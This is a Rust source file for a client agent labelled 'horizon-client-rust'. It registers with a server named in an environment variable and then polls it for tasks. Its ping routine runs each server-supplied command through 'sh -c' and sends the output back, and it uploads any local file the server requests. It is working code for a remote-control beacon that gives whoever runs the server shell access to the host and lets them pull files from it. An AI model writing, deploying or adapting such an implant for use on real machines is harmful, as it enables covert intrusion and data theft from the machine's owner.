use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::error::Error;
use std::fs;
use reqwest::multipart;
use std::process::Command as StdCommand;
use std::env;
use bson::{DateTime, oid::ObjectId};
use dotenv::dotenv;

fn get_server_url() -> Result<String, Box<dyn Error>> {
    dotenv().ok();
    env::var("SERVER_URL").map_err(|e| format!("SERVER_URL environment variable not set: {}", e).into())
}

const TOKEN_FILE: &str = "token.jwt";

#[derive(Deserialize, Debug)]
struct PingResponse {
    pending_uploads: Vec<Upload>,
    pending_commands: Vec<Command>,
}

#[derive(Deserialize, Serialize, Debug)]
pub struct Command {
    pub id: ObjectId,
    pub client: ObjectId,
    pub assigned_by: ObjectId,
    pub query: String,
    pub result: Option<String>,
    pub status: CommandStatus,
    pub registered_at: DateTime,
    pub resulted_at: Option<DateTime>,
}

#[derive(Deserialize, Serialize, Debug)]
#[serde(rename_all = "lowercase")]
pub enum CommandStatus {
    Pending,
    Completed,
    Error,
    Canceled,
}

#[derive(Debug, Deserialize, Serialize)]
pub struct Upload {
    pub id: ObjectId,
    pub client: ObjectId,
    pub assigned_by: ObjectId,
    pub src_file: String,
    pub download_file: Option<String>,
    pub status: Status,
    pub registered_at: DateTime,
    pub uploaded_at: Option<DateTime>,
}

#[derive(Debug, Deserialize, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Status {
    Pending,
    Uploaded,
    Cancelled,
    Uploading,
}

#[derive(Deserialize)]
struct RegisterResponse {
    token: String,
}

#[derive(Serialize)]
struct ExecuteRequest {
    result: String,
}

fn get_server_key() -> Result<String, Box<dyn Error>> {
    dotenv().ok();
    env::var("SERVER_KEY").map_err(|e| format!("SERVER_KEY not set: {}", e).into())
}

async fn get_token() -> Result<String, Box<dyn Error>> {
    match fs::read_to_string(TOKEN_FILE) {
        Ok(token) => Ok(token),
        Err(_) => {
            register().await?;
            Ok(fs::read_to_string(TOKEN_FILE)?)
        }
    }
}

pub async fn register() -> Result<(), Box<dyn Error>> {
    let server_key = get_server_key()?;
    let server_url = get_server_url()?;
    let client = reqwest::Client::new();
    let mut data = HashMap::new();
    data.insert("guid", "some-unique-guid");
    data.insert("agent", "horizon-client-rust");

    let res = client
        .post(format!("{}/client/register", server_url))
        .header("X-Server-Key", server_key)
        .json(&data)
        .send()
        .await?;

    if res.status().is_success() {
        let body = res.json::<RegisterResponse>().await?;
        fs::write(TOKEN_FILE, body.token)?;
        println!("Successfully registered and saved token to {}", TOKEN_FILE);
    } else {
        let error_text = res.text().await?;
        eprintln!("Failed to register: {}", error_text);
    }

    Ok(())
}

pub async fn ping() -> Result<(), Box<dyn Error>> {
    let token = get_token().await?;
    let server_key = get_server_key()?;
    let server_url = get_server_url()?;
    let client = reqwest::Client::new();

    let res = client
        .get(format!("{}/client/ping", server_url))
        .header("X-Server-Key", server_key)
        .bearer_auth(token)
        .send()
        .await?;

    if res.status().is_success() {
        let body = res.json::<PingResponse>().await?;

        for upload in body.pending_uploads {
            if let Err(e) = upload_file(upload.id, &upload.src_file).await {
                eprintln!("Failed to upload file {}: {}", upload.src_file, e);
            }
        }

        for command in body.pending_commands {
            let output = StdCommand::new("sh")
                .arg("-c")
                .arg(&command.query)
                .output()?;

            let result = if output.status.success() {
                String::from_utf8_lossy(&output.stdout).to_string()
            } else {
                String::from_utf8_lossy(&output.stderr).to_string()
            };

            if let Err(e) = execute_command(command.id, &result).await {
                eprintln!("Failed to execute command: {}", e);
            }
        }
    } else {
        let error_text = res.text().await?;
        eprintln!("Ping failed: {}", error_text);
    }

    Ok(())
}

pub async fn upload_file(upload_id: ObjectId, path: &str) -> Result<(), Box<dyn Error>> {
    let token = get_token().await?;
    let server_key = get_server_key()?;
    let server_url = get_server_url()?;
    let file = fs::read(path)?;
    let client = reqwest::Client::new();

    let form = multipart::Form::new()
        .part("file", multipart::Part::bytes(file).file_name(path.to_string()));

    let res = client
        .post(format!("{}/client/upload/result/{}", server_url, upload_id))
        .header("X-Server-Key", server_key)
        .bearer_auth(token)
        .multipart(form)
        .send()
        .await?;

    if res.status().is_success() {
        println!("File '{}' uploaded successfully", path);
    } else {
        let error_text = res.text().await?;
        eprintln!("Failed to upload file: {}", error_text);
    }

    Ok(())
}

pub async fn execute_command(command_id: ObjectId, result: &str) -> Result<(), Box<dyn Error>> {
    let token = get_token().await?;
    let server_key = get_server_key()?;
    let server_url = get_server_url()?;
    let client = reqwest::Client::new();

    let data = ExecuteRequest {
        result: result.to_string(),
    };

    let res = client
        .post(format!("{}/client/commands/result/{}", server_url, command_id))
        .header("X-Server-Key", server_key)
        .bearer_auth(token)
        .json(&data)
        .send()
        .await?;

    if res.status().is_success() {
        println!("Command result sent successfully");
    } else {
        let error_text = res.text().await?;
        eprintln!("Failed to send command result: {}", error_text);
    }

    Ok(())
}